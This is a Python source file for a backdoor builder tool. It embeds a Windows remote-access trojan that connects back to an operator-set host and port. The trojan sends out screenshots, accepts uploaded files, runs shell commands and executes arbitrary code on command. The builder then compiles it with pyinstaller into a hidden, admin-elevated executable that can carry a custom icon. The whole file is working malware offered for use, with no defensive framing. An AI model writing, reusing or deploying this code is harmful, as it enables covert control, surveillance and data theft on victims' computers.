
import os
from misc.logos import builder_logo
from misc.win_deleter import F_0391
from core.utils import clear
from core.colors import *
from core.Sessions.sessions import Session
from core.Sessions.Connection import *

scky_backdoor_code="""
import socket
import base64
import time
import psutil
import subprocess
import pyscreenshot
import threading
import os
shutdown_dict = [b'sd0f',b'lg9',b'lSm2a',b'pLf1',b'lmSD3',b'qD',b'pWc2']
HOST = {0}
PORT = {1}
def msgbox(title,message,icon):
	if icon=='1':icon='vbOKOnly'
	elif icon=='2':icon='vbCritical'
	elif icon=='3':icon='vbQuestion'
	elif icon=='4':icon='vbInformation'
	else:icon='vbOKOnly'
	try:os.remove('c:\\\\_.vbs')
	except:pass
	with open('C:\\\\_.vbs','w+') as f:f.write(f'MsgBox "{message}",{icon},"{title}"')
	os.system('start C:\\\\_.vbs')
def screenshot():
	fn = 'C:\\\\ss.png'
	image = pyscreenshot.grab()
	image.save(fn)
	return fn
def runcmd(command):subprocess.Popen(command,shell=True)
def _runcode(code):
	try:
		exec(code)
		return "Success!"
	except Exception as e:
		return str(e)
def runcode_nocallback(code):
	rc_t=threading.Thread(target=_runcode,args=(code,))
	rc_t.start()
def runcode_callback(code):return _runcode(code.replace('\\\\n','\\\n'))
def wait_for_server():
	while True:
		try:
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			res = sock.connect_ex((HOST,PORT))
			if res == 0:break
		except:pass
		time.sleep(5)
def main():
	while True:
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:sock.connect((HOST,PORT))
		except:wait_for_server()
		while True:
			try:data = sock.recv(1024)
			except ConnectionResetError:break
			if data in shutdown_dict:
				sock.close()
				break
			else:
				data = base64.b64decode(data).decode()
				if data.split(';')[0]=='msgbox':
					msgbox(data.split(';')[1],data.split(';')[2],data.split(';')[3])
				elif data.split(';')[0]=='screenshot':
					fpath=screenshot()
					if os.path.exists(fpath):
						with open(fpath,'rb') as f:
							while True:
								bytes_read = f.read(4096)
								if not bytes_read:
									break
								sock.send(bytes_read)
							sock.send(base64.b64encode('screenshot_ended!'.encode()))
				elif data.split(';')[0]=='sendfile':
					fpath=os.getcwd()+'\\\\'+data.split(';')[1]
					while True:
						data = sock.recv(4096)
						if data != base64.b64encode('file_ended!'.encode()):
							with open(fpath,'ab+') as f: f.write(data)
						else: break
				elif data.split(';')[0]=='runcmd':
					runcmd(data.split(';')[1])
				elif data.split(';')[0]=='runcode_nocallback':
					runcode_nocallback(data.split(';')[1])
				elif data.split(';')[0]=='runcode_callback':
					cb = runcode_callback(data.split(';')[1])
					sock.send(cb.encode())
				elif data.split(';')[0]=='ischeck':pass
		wait_for_server()
main()
"""

def BuildBackdoor():
    clear()
    
    print(builder_logo)
    
    while True:
        print(f'    {R}1. {G}Build .exe for session {R}2. {G}Create new session {R}3. {G}Exit')
        sel = input(f' {G}S C K Y \ B U I L D E R{R}> {N}')
        try: conn_port=int(sel)
        except:
            print(f"{R}    Incorrect. It must be number")
        finally:
            if sel=="1": BuildEXE()
            elif sel=="2":NewSession()
            elif sel=="3":break
            else:print(f'    {R}RETRY!{N}')
    
def NewSession():
    
    print(f"    {C}Enter session display name:{R} ")
    session_display_name = input(f' {G}S C K Y \ B U I L D E R{R}> {N}')
    print(f"    {C}Enter connection ip:{R} ")
    conn_ip = input(f' {G}S C K Y \ B U I L D E R{R}> {N}')
    print(f"    {C}Enter connection port(default=22556):{R} ")
    while True:
        conn_port = input(f' {G}S C K Y \ B U I L D E R{R}> {N}')
        if conn_port=='':
            conn_port = 22556
            break
        try: 
            conn_port=int(conn_port)
            break
        except:
            print(f"{R}    Reenter port, it must be number:")
    
    all_sessions = Session.load_sessions()
    conn_id = len(all_sessions)+1
    
    conn = Connection(conn_ip, conn_port, conn_id)
    session = Session(session_display_name, conn)
    session.save()
    print(f"[{G}+{N}] Session saved with id "+str(conn_id))
    
def BuildEXE():
    while True:
        print(f'    {C}Enter session id:{R} ' )
        ses_id = int(input(f' {G}S C K Y \ B U I L D E R{R}> {N}'))
        for s in Session.load_sessions():
            if s.id == ses_id:
                ses=s
                break
        if ses==None:print('REENTER!')
        break

    print(f"    {C}Enter build filename:{R} ")
    build_fn = input(f' {G}S C K Y \ B U I L D E R{R}> {N}') 
    print(f"    {C}Enter build icon path(skip=default ico):{R} ")
    icon_path = input(f' {G}S C K Y \ B U I L D E R{R}> {N}')
    
    try:os.mkdir('build_tmp')
    except:
        F_0391('build_tmp')
        try:os.mkdir('build_tmp')
        except Exception as e:
            print(f'[{R}-{N}] Can\'t create "build_tmp" directory! Error code: 101 ({e})')
            return False
    try:os.mkdir('build')
    except:
        F_0391('build')
        try:os.mkdir('build')
        except Exception as e:
            print(f'[{R}-{N}] Can\'t create "build_tmp" directory! Error code: 101 ({e})')
            return False
    print(N,end='')
    dist_dir = os.getcwd()+'\\build'
    os.chdir('build_tmp')
    with open(build_fn+'.py','w+') as f:f.write(scky_backdoor_code.replace('{0}',"'"+ses.conn.bind_ip+"'",1).replace('{1}',str(ses.conn.bind_port),1))
    pinst_arg='pyinstaller --noconsole --onefile --noconfirm --uac-admin --uac-uiaccess --log-level=WARN --clean --dist '+dist_dir+' -n '+build_fn+' '
    os.system('python -m pip install --upgrade pip')
    os.system('pip install pyinstaller')
    os.system('pip install --upgrade pyinstaller')
    if icon_path=='' or icon_path==' ':
        os.system(pinst_arg+build_fn+'.py')
    else:
        pinst_arg+=f'--icon {icon_path} '
        os.system(pinst_arg+build_fn+'.py')
    os.chdir('..')
    print(f'{N}[{Y}*{N}] BACKDOOR BUILDED IN DIRECTORY "build", IF pyinstaller NOT RETURNED ERRORS!{N}')
